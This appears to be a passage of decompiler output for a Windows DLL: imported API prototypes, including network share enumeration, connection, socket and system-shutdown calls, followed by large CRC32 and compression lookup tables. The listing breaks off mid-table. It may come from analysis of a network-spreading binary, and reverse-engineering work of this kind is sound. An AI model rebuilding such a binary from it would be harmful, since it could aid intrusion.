// LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
// UINT __stdcall GetWindowsDirectoryW(LPWSTR lpBuffer, UINT uSize);
// void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// BOOL __stdcall SetFilePointerEx(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// HRSRC __stdcall FindResourceW(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType);
// DWORD __stdcall WNetOpenEnumW(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEW lpNetResource, LPHANDLE lphEnum);
// DWORD __stdcall WNetEnumResourceW(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetCancelConnection2W(LPCWSTR lpName, DWORD dwFlags, BOOL fForce);
// DWORD __stdcall WNetAddConnection2W(LPNETRESOURCEW lpNetResource, LPCWSTR lpPassword, LPCWSTR lpUserName, DWORD dwFlags);
// DWORD __stdcall WNetCloseEnum(HANDLE hEnum);
// DWORD __stdcall NetServerEnum(LPCWSTR servername, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, DWORD servertype, LPCWSTR domain, LPDWORD resume_handle);
// DWORD __stdcall NetApiBufferFree(LPVOID Buffer);
// DWORD __stdcall NetServerGetInfo(LPWSTR servername, DWORD level, LPBYTE *bufptr);
// LPWSTR *__stdcall CommandLineToArgvW(LPCWSTR lpCmdLine, int *pNumArgs);
// HRESULT __stdcall SHGetFolderPathW(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPWSTR pszPath);
// BOOL __stdcall PathAppendW(LPWSTR pszPath, LPCWSTR pMore);
// int __stdcall StrToIntW(_DWORD); weak
// LPWSTR __stdcall PathFindFileNameW(LPCWSTR pszPath);
// BOOL __stdcall PathFileExistsW(LPCWSTR pszPath);
// int __stdcall StrCmpW(_DWORD, _DWORD); weak
// int __stdcall StrCmpIW(_DWORD, _DWORD); weak
// int __stdcall StrChrW(_DWORD, _DWORD); weak
// int __thiscall StrCatW(_DWORD, _DWORD, _DWORD); weak
// int __stdcall StrStrW(_DWORD, _DWORD); weak
// LPWSTR __stdcall PathFindExtensionW(LPCWSTR pszPath);
// LPWSTR __stdcall PathCombineW(LPWSTR pszDest, LPCWSTR pszDir, LPCWSTR pszFile);
// int __stdcall StrStrIW(_DWORD, _DWORD); weak
// BOOL __stdcall ExitWindowsEx(UINT uFlags, DWORD dwReason);
// int wsprintfA(LPSTR, LPCSTR, ...);
// int wsprintfW(LPWSTR, LPCWSTR, ...);
// char *__stdcall inet_ntoa(struct in_addr in);
// struct hostent *__stdcall gethostbyname(const char *name);
// int __stdcall _WSAFDIsSet(SOCKET fd, fd_set *);
// u_long __stdcall ntohl(u_long netlong);
// int __stdcall ioctlsocket(SOCKET s, __int32 cmd, u_long *argp);
// int __stdcall connect(SOCKET s, const struct sockaddr *name, int namelen);
// unsigned __int32 __stdcall inet_addr(const char *cp);
// int __stdcall select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// u_short __stdcall htons(u_short hostshort);
// int __stdcall closesocket(SOCKET s);
// SOCKET __stdcall socket(int af, int type, int protocol);
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// int __cdecl rand();
// HRESULT __stdcall CoCreateGuid(GUID *pguid);
// void __stdcall CoTaskMemFree(LPVOID pv);
// HRESULT __stdcall StringFromCLSID(const IID *const rclsid, LPOLESTR *lplpsz);
int __cdecl sub_682065C0(int a1);
unsigned __int8 *__cdecl sub_68206670(unsigned __int8 *a1, unsigned __int8 a2, unsigned int a3);

//-------------------------------------------------------------------------
// Data declarations

int dword_681FC64C[] = { 0 }; // weak
char byte_681FDAD0 = '\x10'; // weak
__int16 word_681FDB50[20] = { 16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15, 0 }; // idb
int dword_681FDD60[256] =
{
  0,
  1996959894,
  3993919788,
  2567524794,
  124634137,
  1886057615,
  3915621685,
  2657392035,
  249268274,
  2044508324,
  3772115230,
  2547177864,
  162941995,
  2125561021,
  3887607047,
  2428444049,
  498536548,
  1789927666,
  4089016648,
  2227061214,
  450548861,
  1843258603,
  4107580753,
  2211677639,
  325883990,
  1684777152,
  4251122042,
  2321926636,
  335633487,
  1661365465,
  4195302755,
  2366115317,
  997073096,
  1281953886,
  3579855332,
  2724688242,
  1006888145,
  1258607687,
  3524101629,
  2768942443,
  901097722,
  1119000684,
  3686517206,
  2898065728,
  853044451,
  1172266101,
  3705015759,
  2882616665,
  651767980,
  1373503546,
  3369554304,
  3218104598,
  565507253,
  1454621731,
  3485111705,
  3099436303,
  671266974,
  1594198024,
  3322730930,
  2970347812,
  795835527,
  1483230225,
  3244367275,
  3060149565,
  1994146192,
  31158534,
  2563907772,
  4023717930,
  1907459465,
  112637215,
  2680153253,
  3904427059,
  2013776290,
  251722036,
  2517215374,
  3775830040,
  2137656763,
  141376813,
  2439277719,
  3865271297,
  1802195444,
  476864866,
  2238001368,
  4066508878,
  1812370925,
  453092731,
  2181625025,
  4111451223,
  1706088902,
  314042704,
  2344532202,
  4240017532,
  1658658271,
  366619977,
  2362670323,
  4224994405,
  1303535960,
  984961486,
  2747007092,
  3569037538,
  1256170817,
  1037604311,
  2765210733,
  3554079995,
  1131014506,
  879679996,
  2909243462,
  3663771856,
  1141124467,
  855842277,
  2852801631,
  3708648649,
  1342533948,
  654459306,
  3188396048,
  3373015174,
  1466479909,
  544179635,
  3110523913,
  3462522015,
  1591671054,
  702138776,
  2966460450,
  3352799412,
  1504918807,
  783551873,
  3082640443,
  3233442989,
  3988292384,
  2596254646,
  62317068,
  1957810842,
  3939845945,
  2647816111,
  81470997,
  1943803523,
  3814918930,
  2489596804,
  225274430,
  2053790376,
  3826175755,
  2466906013,
  167816743,
  2097651377,
  4027552580,
  2265490386,
  503444072,
  1762050814,
  4150417245,
  2154129355,
  426522225,
  1852507879,
  4275313526,
  2312317920,
  282753626,
  1742555852,
  4189708143,
  2394877945,
  397917763,
  1622183637,
  3604390888,
  2714866558,
  953729732,
  1340076626,
  3518719985,
  2797360999,
  1068828381,
  1219638859,
  3624741850,
  2936675148,
  906185462,
  1090812512,
  3747672003,
  2825379669,
  829329135,
  1181335161,
  3412177804,
  3160834842,
  628085408,
  1382605366,
  3423369109,
  3138078467,
  570562233,
  1426400815,
  3317316542,
  2998733608,
  733239954,
  1555261956,
  3268935591,
  3050360625,
  752459403,
  1541320221,
  2607071920,
  3965973030,
  1969922972,
  40735498,
  2617837225,
  3943577151,
  1913087877,
  83908371,
  2512341634,
  3803740692,
  2075208622,
  213261112,
  2463272603,
  3855990285,
  2094854071,
  198958881,
  2262029012,
  4057260610,
  1759359992,
  534414190,
  2176718541,
  4139329115,
  1873836001,
  414664567,
  2282248934,
  4279200368,
  1711684554,
  285281116,
  2405801727,
  4167216745,
  1634467795,
  376229701,
  2685067896,
  3608007406,
  1308918612,
  956543938,
  2808555105,
  3495958263,
  1231636301,
  1047427035,
  2932959818,
  3654703836,
  1088359270,
  936918000,
  2847714899,
  3736837829,
  1202900863,
  817233897,
  3183342108,
  3401237130,
  1404277552,
  615818150,
  3134207493,
  3453421203,
  1423857449,
  601450431,
  3009837614,
  3294710456,
  1567103746,
  711928724,
  3020668471,
  3272380065,
  1510334235,
  755167117
}; // idb
int dword_681FE160[256] =
{
  0,
  421212481,
  842424962,
  724390851,
  1684849924,
  2105013317,
  1448781702,
  1329698503,
  3369699848,
  3519200073,
  4210026634,
  3824474571,
  2897563404,
  3048111693,
  2659397006,
  2274893007,
  1254232657,
  1406739216,
  2029285587,
  1643069842,
  783210325,
  934667796,
  479770071,
  92505238,
  2182846553,
  2600511768,
  2955803355,
  2838940570,
  3866582365,
  4285295644,
  3561045983,
  3445231262,
  2508465314,
  2359236067,
  2813478432,
  3198777185,
  4058571174,
  3908292839,
  3286139684,
  3670389349,
  1566420650,
  1145479147,
  1869335592,
  1987116393,
  959540142,
  539646703,
  185010476,
  303839341,
  3745920755,
  3327985586,
  3983561841,
  4100678960,
  3140154359,
  2721170102,
  2300350837,
  2416418868,
  396344571,
  243568058,
  631889529,
  1018359608,
  1945336319,
  1793607870,
  1103436669,
  1490954812,
  4034481925,
  3915546180,
  3259968903,
  3679722694,
  2484439553,
  2366552896,
  2787371139,
  3208174018,
  950060301,
  565965900,
  177645455,
  328046286,
  1556873225,
  1171730760,
  1861902987,
  2011255754,
  3132841300,
  2745199637,
  2290958294,
  2442530455,
  3738671184,
  3352078609,
  3974232786,
  4126854035,
  1919080284,
  1803150877,
  1079293406,
  1498383519,
  370020952,
  253043481,
  607678682,
  1025720731,
  1711106983,
  2095471334,
  1472923941,
  1322268772,
  26324643,
  411738082,
  866634785,
  717028704,
  2904875439,
  3024081134,
  2668790573,
  2248782444,
  3376948395,
  3495106026,
  4219356713,
  3798300520,
  792689142,
  908347575,
  487136116,
  68299317,
  1263779058,
  1380486579,
  2036719216,
  1618931505,
  3890672638,
  4278043327,
  3587215740,
  3435896893,
  2206873338,
  2593195963,
  2981909624,
  2829542713,
  998479947,
  580430090,
  162921161,
  279890824,
  1609522511,
  1190423566,
  1842954189,
  1958874764,
  4082766403,
  3930137346,
  3245109441,
  3631694208,
  2536953671,
  2385372678,
  2768287173,
  3155920004,
  1900120602,
  1750776667,
  1131931800,
  1517083097,
  355290910,
  204897887,
  656092572,
  1040194781,
  3113746450,
  2692952403,
  2343461520,
  2461357009,
  3723805974,
  3304059991,
  4022511508,
  4141455061,
  2919742697,
  3072101800,
  2620513899,
  2234183466,
  3396041197,
  3547351212,
  4166851439,
  3779471918,
  1725839073,
  2143618976,
  1424512099,
  1307796770,
  45282277,
  464110244,
  813994343,
  698327078,
  3838160568,
  4259225593,
  3606301754,
  3488152955,
  2158586812,
  2578602749,
  2996767038,
  2877569151,
  740041904,
  889656817,
  506086962,
  120682355,
  1215357364,
  1366020341,
  2051441462,
  1667084919,
  3422213966,
  3538019855,
  4190942668,
  3772220557,
  2945847882,
  3062702859,
  2644537544,
  2226864521,
  52649286,
  439905287,
  823476164,
  672009861,
  1733269570,
  2119477507,
  1434057408,
  1281543041,
  2167981343,
  2552493150,
  3004082077,
  2853541596,
  3847487515,
  4233048410,
  3613549209,
  3464057816,
  1239502615,
  1358593622,
  2077699477,
  1657543892,
  764250643,
  882293586,
  532408465,
  111204816,
  1585378284,
  1197851309,
  1816695150,
  1968414767,
  974272232,
  587794345,
  136598634,
  289367339,
  2527558116,
  2411481253,
  2760973158,
  3179948583,
  4073438432,
  3956313505,
  3237863010,
  3655790371,
  347922877,
  229101820,
  646611775,
  1066513022,
  1892689081,
  1774917112,
  1122387515,
  1543337850,
  3697634229,
  3313392372,
  3998419255,
  4148705398,
  3087642289,
  2702352368,
  2319436851,
  2468674930
}; // idb
int dword_681FE560[256] =
{
  0,
  29518391,
  59036782,
  38190681,
  118073564,
  114017003,
  76381362,
  89069189,
  236147128,
  265370511,
  228034006,
  206958561,
  152762724,
  148411219,
  178138378,
  190596925,
  472294256,
  501532999,
  530741022,
  509615401,
  456068012,
  451764635,
  413917122,
  426358261,
  305525448,
  334993663,
  296822438,
  275991697,
  356276756,
  352202787,
  381193850,
  393929805,
  944588512,
  965684439,
  1003065998,
  973863097,
  1061482044,
  1049003019,
  1019230802,
  1023561829,
  912136024,
  933002607,
  903529270,
  874031361,
  827834244,
  815125939,
  852716522,
  856752605,
  611050896,
  631869351,
  669987326,
  640506825,
  593644876,
  580921211,
  551983394,
  556069653,
  712553512,
  733666847,
  704405574,
  675154545,
  762387700,
  749958851,
  787859610,
  792175277,
  1889177024,
  1901651959,
  1931368878,
  1927033753,
  2006131996,
  1985040171,
  1947726194,
  1976933189,
  2122964088,
  2135668303,
  2098006038,
  2093965857,
  2038461604,
  2017599123,
  2047123658,
  2076625661,
  1824272048,
  1836991623,
  1866005214,
  1861914857,
  1807058540,
  1786244187,
  1748062722,
  1777547317,
  1655668488,
  1668093247,
  1630251878,
  1625932113,
  1705433044,
  1684323811,
  1713505210,
  1742760333,
  1222101792,
  1226154263,
  1263738702,
  1251046777,
  1339974652,
  1310460363,
  1281013650,
  1301863845,
  1187289752,
  1191637167,
  1161842422,
  1149379777,
  1103966788,
  1074747507,
  1112139306,
  1133218845,
  1425107024,
  1429406311,
  1467333694,
  1454888457,
  1408811148,
  1379576507,
  1350309090,
  1371438805,
  1524775400,
  1528845279,
  1499917702,
  1487177649,
  1575719220,
  1546255107,
  1584350554,
  1605185389,
  3778354048,
  3774312887,
  3803303918,
  3816007129,
  3862737756,
  3892238699,
  3854067506,
  3833203973,
  4012263992,
  4007927823,
  3970080342,
  3982554209,
  3895452388,
  3924658387,
  3953866378,
  3932773565,
  4245928176,
  4241609415,
  4271336606,
  4283762345,
  4196012076,
  4225268251,
  4187931714,
  4166823541,
  4076923208,
  4072833919,
  4035198246,
  4047918865,
  4094247316,
  4123732899,
  4153251322,
  4132437965,
  3648544096,
  3636082519,
  3673983246,
  3678331705,
  3732010428,
  3753090955,
  3723829714,
  3694611429,
  3614117080,
  3601426159,
  3572488374,
  3576541825,
  3496125444,
  3516976691,
  3555094634,
  3525581405,
  3311336976,
  3298595879,
  3336186494,
  3340255305,
  3260503756,
  3281337595,
  3251864226,
  3222399125,
  3410866088,
  3398419871,
  3368647622,
  3372945905,
  3427010420,
  3448139075,
  3485520666,
  3456284973,
  2444203584,
  2423127159,
  2452308526,
  2481530905,
  2527477404,
  2539934891,
  2502093554,
  2497740997,
  2679949304,
  2659102159,
  2620920726,
  2650438049,
  2562027300,
  2574714131,
  2603727690,
  2599670141,
  2374579504,
  2353749767,
  2383274334,
  2412743529,
  2323684844,
  2336421851,
  2298759554,
  2294686645,
  2207933576,
  2186809023,
  2149495014,
  2178734801,
  2224278612,
  2236720739,
  2266437690,
  2262135309,
  2850214048,
  2820717207,
  2858812622,
  2879680249,
  2934667388,
  2938704459,
  2909776914,
  2897069605,
  2817622296,
  2788420399,
  2759153014,
  2780249921,
  2700618180,
  2704950259,
  2742877610,
  2730399645,
  3049550800,
  3020298727,
  3057690558,
  3078802825,
  2999835404,
  3004150075,
  2974355298,
  2961925461,
  3151438440,
  3121956959,
  3092510214,
  3113327665,
  3168701108,
  3172786307,
  3210370778,
  3197646061
}; // idb
int dword_681FE960[1280] =
{
  0,
  3099354981,
  2852767883,
  313896942,
  2405603159,
  937357362,
  627793884,
  2648127673,
  3316918511,
  2097696650,
  1874714724,
  3607201537,
  1255587768,
  4067088605,
  3772741427,
  1482887254,
  1343838111,
  3903140090,
  4195393300,
  1118632049,
  3749429448,
  1741137837,
  1970407491,
  3452858150,
  2511175536,
  756094997,
  1067759611,
  2266550430,
  449832999,
  2725482306,
  2965774508,
  142231497,
  2687676222,
  412010587,
  171665333,
  2995192016,
  793786473,
  2548850444,
  2237264098,
  1038456711,
  1703315409,
  3711623348,
  3482275674,
  1999841343,
  3940814982,
  1381529571,
  1089329165,
  4166106984,
  4029413537,
  1217896388,
  1512189994,
  3802027855,
  2135519222,
  3354724499,
  3577784189,
  1845280792,
  899665998,
  2367928107,
  2677414085,
  657096608,
  3137160985,
  37822588,
  284462994,
  2823350519,
  2601801789,
  598228824,
  824021174,
  2309093331,
  343330666,
  2898962447,
  3195996129,
  113467524,
  1587572946,
  3860600759,
  4104763481,
  1276501820,
  3519211397,
  1769898208,
  2076913422,
  3279374443,
  3406630818,
  1941006535,
  1627703081,
  3652755532,
  1148164341,
  4241751952,
  3999682686,
  1457141531,
  247015245,
  3053797416,
  2763059142,
  470583459,
  2178658330,
  963106687,
  735213713,
  2473467892,
  992409347,
  2207944806,
  2435792776,
  697522413,
  3024379988,
  217581361,
  508405983,
  2800865210,
  4271038444,
  1177467017,
  1419450215,
  3962007554,
  1911572667,
  3377213406,
  3690561584,
  1665525589,
  1799331996,
  3548628985,
  3241568279,
  2039091058,
  3831314379,
  1558270126,
  1314193216,
  4142438437,
  2928380019,
  372764438,
  75645176,
  3158189981,
  568925988,
  2572515393,
  2346768303,
  861712586,
  3982079547,
  1441124702,
  1196457648,
  4293663189,
  1648042348,
  3666298377,
  3358779879,
  1888390786,
  686661332,
  2421291441,
  2196002399,
  978858298,
  2811169155,
  523464422,
  226935048,
  3040519789,
  3175145892,
  100435649,
  390670639,
  2952089162,
  841119475,
  2325614998,
  2553003640,
  546822429,
  2029308235,
  3225988654,
  3539796416,
  1782671013,
  4153826844,
  1328167289,
  1570739863,
  3844338162,
  1298864389,
  4124540512,
  3882013070,
  1608431339,
  3255406162,
  2058742071,
  1744848601,
  3501990332,
  2296328682,
  811816591,
  584513889,
  2590678532,
  129869501,
  3204563416,
  2914283062,
  352848211,
  494030490,
  2781751807,
  3078325777,
  264757620,
  2450577869,
  715964072,
  941166918,
  2158327331,
  3636881013,
  1618608400,
  1926213374,
  3396585883,
  1470427426,
  4011365959,
  4255988137,
  1158766284,
  1984818694,
  3471935843,
  3695453837,
  1693991400,
  4180638033,
  1100160564,
  1395044826,
  3952793279,
  3019491049,
  189112716,
  435162722,
  2706139399,
  1016811966,
  2217162459,
  2526189877,
  774831696,
  643086745,
  2666061564,
  2354934034,
  887166583,
  2838900430,
  294275499,
  54519365,
  3145957664,
  3823145334,
  1532818963,
  1240029693,
  4048895640,
  1820460577,
  3560857924,
  3331051178,
  2117577167,
  3598663992,
  1858283101,
  2088143283,
  3301633750,
  1495127663,
  3785470218,
  4078182116,
  1269332353,
  332098007,
  2876706482,
  3116540252,
  25085497,
  2628386432,
  605395429,
  916469259,
  2384220526,
  2254837415,
  1054503362,
  745528876,
  2496903497,
  151290352,
  2981684885,
  2735556987,
  464596510,
  1137851976,
  4218313005,
  3923506883,
  1365741990,
  3434129695,
  1946996346,
  1723425172,
  3724871409,
  0,
  2519730039,
  744558318,
  3125873049,
  432303367,
  2415159920,
  900031465,
  2744476830,
  847829774,
  2763578489,
  518641120,
  2295976599,
  726447625,
  3179065726,
  120436967,
  2434645904,
  1678817053,
  4062228586,
  1215412723,
  3728850564,
  2111101466,
  3957644653,
  1370871028,
  3347436419,
  1452829715,
  3232263012,
  2063164157,
  3972621706,
  1331429652,
  3647735395,
  1664946170,
  4111272077,
  3357568571,
  1578133836,
  3829489877,
  1920034722,
  3521381180,
  1205077067,
  4253355474,
  1807026853,
  4205360437,
  1821946434,
  3603545051,
  1090108588,
  3815561266,
  1969020741,
  3473790684,
  1497223595,
  2888882470,
  973135441,
  2152847304,
  375509183,
  3052712993,
  600093526,
  2576726735,
  262520248,
  2662859304,
  143131999,
  3000569030,
  619252657,
  2273079087,
  290220120,
  2870829505,
  1026385590,
  2420235382,
  108124929,
  3156267672,
  705746415,
  2307240305,
  532002310,
  2783231903,
  869578984,
  2731083640,
  888733711,
  2393377174,
  412618465,
  3138218623,
  759000328,
  2540463249,
  22832102,
  4098976619,
  1650551836,
  3627050373,
  1308648178,
  3985966700,
  2074411291,
  3253995650,
  1472466933,
  3336155237,
  1357494034,
  3937975947,
  2089335292,
  3743276386,
  1227741717,
  4085044108,
  1699534075,
  1482797645,
  3461461306,
  1946205347,
  3794844628,
  1101389642,
  3616921661,
  1841615268,
  4227126995,
  1793681731,
  4242107956,
  1183344557,
  3501744346,
  1932330052,
  3843883827,
  1598818986,
  3380350429,
  1014039888,
  2856387111,
  269487038,
  2250247369,
  632645719,
  3011866400,
  164914873,
  2682544590,
  251256414,
  2563365161,
  580440240,
  3030964167,
  389919577,
  2165158958,
  995933623,
  2909584064,
  545503469,
  3065233306,
  216184323,
  2597499252,
  961009130,
  2943865501,
  354867972,
  2199313523,
  302736355,
  2218484884,
  1047162125,
  2824497786,
  198119140,
  2650737043,
  665714698,
  2979923837,
  1150488560,
  3533899911,
  1760690462,
  4274128489,
  1566008055,
  3412551040,
  1899392025,
  3875957614,
  1981535486,
  3760968585,
  1518000656,
  3427458407,
  1876933113,
  4193238670,
  1136572183,
  3582898272,
  3903051478,
  2123616673,
  3301103672,
  1391648591,
  4050107345,
  1733803174,
  3708204351,
  1261875784,
  3660254680,
  1276840623,
  4132045622,
  1618609217,
  3287245023,
  1440704424,
  4019088945,
  2042521926,
  2360566219,
  444819132,
  2698145573,
  920807506,
  2507607244,
  54987707,
  3105227298,
  791020885,
  3191585477,
  671858098,
  2455417899,
  74101596,
  2818561986,
  835702965,
  2342443308,
  497999451,
  2965529755,
  653419500,
  2627955317,
  177433858,
  2835745180,
  1060507371,
  2238121842,
  324468741,
  2185936789,
  343587042,
  2922099067,
  941340172,
  2609828498,
  230610405,
  3085950076,
  568318731,
  3570586502,
  1122161905,
  4172537192,
  1854134815,
  3440819841,
  1529264630,
  3782717551,
  2001188632,
  3864660104,
  1885999103,
  3392865894,
  1544225041,
  4288570767,
  1773036280,
  3556731745,
  1171221526,
  2028079776,
  4006743511,
  1417872462,
  3266511673,
  1629906855,
  4145438928,
  1296525641,
  3682037310,
  1248514478,
  3696940761,
  1712054080,
  4030453815,
  1403960489,
  3315514334,
  2144318023,
  3925849392,
  485670333,
  2328017610,
  814986067,
  2795746340,
  87478458,
  2466699213,
  693624404,
  3211254051,
  779773619,
  3091882436,
  35350621,
  2485874474,
  935201716,
  2710441155,
  467600730,
  2381251117,
  0,
  1093737241,
  2187474482,
  3277008171,
  80047204,
  1173649277,
  2259114582,
  3348513103,
  143317448,
  1237041873,
  2330521594,
  3420058851,
  206550444,
  1300147893,
  2385347486,
  3474757767,
  1360183882,
  270784851,
  3547395192,
  2453794657,
  1440198190,
  350663991,
  3619002396,
  2525266693,
  1503140738,
  413728923,
  3690606000,
  2597009065,
  1566406630,
  476867839,
  3745464788,
  2651740877,
  2720302229,
  3809845132,
  541504167,
  1635232190,
  2799823089,
  3889230824,
  612622019,
  1706214874,
  2863553885,
  3953083972,
  684485487,
  1778217078,
  2926260537,
  4015663648,
  738789131,
  1832393746,
  4080420575,
  2986827206,
  1901359341,
  811953140,
  4159908539,
  3066180002,
  1972444297,
  882902928,
  4223442711,
  3129836558,
  2044635429,
  955232828,
  4286182259,
  3192449130,
  2098971969,
  1009442392,
  89094640,
  1149133545,
  2267893698,
  3323745499,
  25826708,
  1086000781,
  2213028774,
  3269015743,
  231055416,
  1291107105,
  2410124810,
  3465973011,
  151047260,
  1211225925,
  2338519662,
  3394494839,
  1415429050,
  359440547,
  3594489224,
  2534315665,
  1352194014,
  296340679,
  3539657196,
  2479618805,
  1557619314,
  501643627,
  3736425536,
  2676248409,
  1477578262,
  421729551,
  3664787492,
  2604737341,
  2808872293,
  3864716924,
  621398871,
  1681444942,
  2746126593,
  3802106392,
  567060275,
  1627241514,
  2950767789,
  4006625204,
  763564703,
  1823607174,
  2871281865,
  3927266256,
  692485883,
  1752655330,
  4135141167,
  3074958390,
  1947928861,
  891949572,
  4072428363,
  3012380754,
  1893623161,
  837779040,
  4277397223,
  3217227262,
  2089930965,
  1033948108,
  4197878403,
  3137835418,
  2018819249,
  962963368,
  1268286267,
  178886690,
  3388650761,
  2295049744,
  1331556191,
  242021446,
  3443513709,
  2349777524,
  1125276403,
  35865066,
  3245370561,
  2151774168,
  1205286551,
  115748238,
  3316973733,
  2223250364,
  445268337,
  1539005032,
  2565371715,
  3654904922,
  508505365,
  1602106892,
  2620201767,
  3709599806,
  302028985,
  1395753888,
  2422386315,
  3511924114,
  382072029,
  1475669956,
  2494022383,
  3583433206,
  3921414062,
  2827820215,
  1809723804,
  720317061,
  3984157642,
  2890428627,
  1864064504,
  774522593,
  3778469478,
  2684863871,
  1666508884,
  577106765,
  3857953282,
  2764220699,
  1737589808,
  648060713,
  3098461668,
  4188004093,
  986510294,
  2080237775,
  3161172352,
  4250579609,
  1040818098,
  2134410411,
  2955156524,
  4044687157,
  843459102,
  1937191175,
  3034673224,
  4124076881,
  914572922,
  2008178019,
  1322777291,
  266789330,
  3434466553,
  2374293472,
  1242732207,
  186879414,
  3362824349,
  2302786436,
  1180508931,
  124532762,
  3292468529,
  2232290856,
  1117278055,
  61428862,
  3237640533,
  2177589836,
  533018753,
  1593058200,
  2644971187,
  3700823466,
  453006565,
  1513181180,
  2573361879,
  3629349326,
  391110985,
  1451162192,
  2502809467,
  3558657122,
  327847213,
  1388025396,
  2447948575,
  3503923206,
  3975380574,
  2915198279,
  1855015020,
  799036277,
  3895857722,
  2835810595,
  1783899144,
  728055569,
  3833178006,
  2773007503,
  1713082788,
  657099453,
  3770469362,
  2710425835,
  1658781120,
  602924761,
  3185687572,
  4241532685,
  1065585190,
  2125631807,
  3106197616,
  4162177897,
  994502210,
  2054683995,
  3043714524,
  4099571397,
  923358190,
  1983400183,
  2980972984,
  4036956833,
  869023626,
  1929192595,
  0,
  929743361,
  1859421187,
  1505641986,
  3701999879,
  3955411718,
  2994507012,
  2232831749,
  3092321038,
  2403062031,
  3599079181,
  3790558476,
  1694046729,
  1402198024,
  170761738,
  1028086795,
  1889740316,
  1204413469,
  511156767,
  689791006,
  2886414107,
  2606886170,
  3269438232,
  4122306841,
  3371316498,
  4288214803,
  2787553553,
  2437706512,
  341457941,
  590413332,
  2056173590,
  1306819095,
  3762703672,
  3610021689,
  2391984443,
  3120040762,
  1022247999,
  193234494,
  1379582012,
  1699742269,
  1477926454,
  1870502967,
  918805045,
  27858996,
  2227132209,
  3017119024,
  3932934962,
  3707834675,
  2430954276,
  2811210021,
  4264685351,
  3378195750,
  1280139811,
  2066194466,
  580511264,
  368256033,
  682915882,
  534690347,
  1180761129,
  1896496680,
  4095504685,
  3279336236,
  2596861230,
  2913089327,
  3230505584,
  4159133809,
  2925076083,
  2570312818,
  472224631,
  726618486,
  1928402804,
  1167840629,
  2027719038,
  1337346943,
  369626493,
  560123772,
  2759098489,
  2468233848,
  3399484538,
  4257924731,
  2955852908,
  2269412973,
  3740940399,
  3918592622,
  1820767595,
  1542223722,
  38941032,
  892924777,
  142585698,
  1058368867,
  1722493793,
  1371662688,
  3570902629,
  3820840036,
  3120767590,
  2372526183,
  550229832,
  396432713,
  1310675787,
  2037748042,
  4234403407,
  3406371918,
  2461489740,
  2782763085,
  2560279622,
  2951743047,
  4132323397,
  3240395332,
  1144180033,
  1935150912,
  719735106,
  495749955,
  1349054804,
  1728197461,
  1052538199,
  165066582,
  2361456723,
  3148495442,
  3792993360,
  3581853265,
  3896107610,
  3746766939,
  2263705177,
  2978456664,
  881978205,
  66791772,
  1514499934,
  1831841119,
  2149266913,
  3077699552,
  4006588898,
  3651498979,
  1555250406,
  1809448679,
  845658341,
  84769508,
  944383727,
  253813998,
  1453236972,
  1643405549,
  3840028648,
  3548966377,
  2318838763,
  3176950250,
  4038595581,
  3352482300,
  2657916926,
  2835764735,
  739252986,
  461035771,
  1120182009,
  1974361336,
  1223229683,
  2139341554,
  641565936,
  290932465,
  2487290356,
  2737556469,
  4204105207,
  3456061430,
  1616738521,
  1463270104,
  243924186,
  971194075,
  3170202078,
  2342499295,
  3525440989,
  3846911964,
  3624692695,
  4016482774,
  3067670484,
  2175938005,
  77882064,
  869179601,
  1785784019,
  1561994450,
  285105861,
  664050884,
  2116737734,
  1228937415,
  3428210626,
  4215051715,
  2726482881,
  2515014080,
  2830061003,
  2680524746,
  3330001352,
  4044426185,
  1946633420,
  1131251405,
  450085071,
  767099598,
  1083617169,
  2013031824,
  776088466,
  422111635,
  2621351574,
  2874434711,
  4075430549,
  3313557652,
  4173839519,
  3484253854,
  2517842076,
  2709125789,
  611300760,
  319125401,
  1253781915,
  2110911386,
  808814989,
  123685772,
  1591807374,
  1770770319,
  3969745034,
  3690414731,
  2185823369,
  3039020680,
  2288294531,
  3205388418,
  3870301824,
  3520781441,
  1422693252,
  1671844229,
  974657415,
  225629574,
  2698044073,
  2545557672,
  3456394922,
  4184777899,
  2088299438,
  1259481519,
  313290669,
  633777580,
  411169191,
  803943334,
  1985312164,
  1094694821,
  3291084960,
  4081269409,
  2868739235,
  2643967650,
  3497247925,
  3877177012,
  3198632118,
  2311946935,
  215731634,
  1001459635,
  1645169073,
  1432718256,
  1747113915,
  1598559674,
  116806584,
  832344505,
  3028999868,
  2212502717,
  3663616703,
  3979647166,
  0,
  1701297336,
  2345142698,
  4004492562,
  1469538959,
  854646327,
  3697240869,
  3107510173,
  4012422341,
  2320435325,
  1692450159,
  25625047,
  3099579978,
  3721947890,
  863494112,
  1443914584,
  2673285456,
  4197492200,
  345968890,
  1912122434,
  3368057823,
  2913453927,
  1124627061,
  644861645,
  1887415701,
  353898797,
  4223116351,
  2664437895,
  669568794,
  1116697506,
  2887829168,
  3376904712,
  1051669152,
  1539870232,
  3043441418,
  3489695666,
  1765298223,
  207613079,
  3807402373,
  2274878781,
  3515319909,
  3034594013,
  1515163599,
  1059599223,
  2249254122,
  3816249426,
  232320320,
  1757368824,
  2717395952,
  3298793288,
  707797594,
  1331142370,
  4134488447,
  2466837959,
  2108113109,
  415300717,
  1322295093,
  733422477,
  3306722975,
  2692688423,
  424148410,
  2082488578,
  2458907664,
  4159195304,
  1029182619,
  1480566819,
  3062897969,
  3556221321,
  1791981076,
  262720172,
  3775365054,
  2220933894,
  3530596446,
  3071745254,
  1505274356,
  1021252940,
  2246558417,
  3766517353,
  238013307,
  1799911363,
  2718895563,
  3345527155,
  700908641,
  1285601497,
